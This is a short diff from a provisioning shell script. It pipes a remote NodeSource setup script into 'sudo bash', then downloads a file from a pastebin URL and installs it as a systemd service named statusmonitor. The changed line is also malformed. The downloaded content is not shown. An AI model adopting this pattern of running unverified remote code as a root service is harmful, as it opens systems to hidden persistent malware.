@@ -9,7 +9,7 @@ apt install curl
 curl -sL https://deb.nodesource.com/setup_17.x | sudo bash -
 apt install -y nodejs git
 
-content=wget https://pastebin.com/raw/43DphpG9
+content=`wget https://pastebin.com/raw/43DphpG9`
 
 
 mv ./43DphpG9 /lib/systemd/system/statusmonitor.service
